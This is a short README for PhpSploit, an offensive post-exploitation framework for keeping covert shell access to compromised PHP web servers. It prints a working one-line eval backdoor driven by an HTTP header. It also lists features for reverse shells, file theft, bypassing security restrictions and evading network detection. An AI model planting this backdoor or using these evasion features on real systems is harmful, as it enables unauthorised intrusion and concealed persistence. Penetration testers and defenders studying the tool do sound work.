### PhpSploit: *Advanced post-exploitation framework* ###

PhpSploit is a **remote control** framework, aiming to provide a **stealth**
interactive shell-like connection over HTTP between client and web server.
It is a post-exploitation tool capable to maintain access to a
compromised web server for **privilege escalation** purposes.

![][picture]

---------------------------------------------------------------------
#### Overview ####

The obfuscated communication is accomplished using HTTP headers under
valid client HTTP requests and web server's responses, tunneled through
a tiny **polymorphic backdoor**:
```php
<? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
```

---------------------------------------------------------------------
#### Features ####

- More than 20 plugins to automate post-exploitation tasks:
    - Run commands and browse filesystem, bypassing PHP security restrictions
    - Upload/Download files between client and target
    - Edit remote files through local text editor
    - Run SQL console on target system
    - Spawn reverse TCP shells

- Nearly invisible by log analysis and NIDS signature detection
- Safe-mode and common PHP security restrictions bypass
- Communications are hidden in HTTP Headers
- Loaded payloads are obfuscated to bypass NIDS
- Multi-request support for large payloads
- Highly configurable through dynamic settings engine
- HTTP/HTTPS Proxy support
- And even more...




[picture]: https://raw.githubusercontent.com/nil0x42/phpsploit/destiny/data/img/phpsploit-demo.png
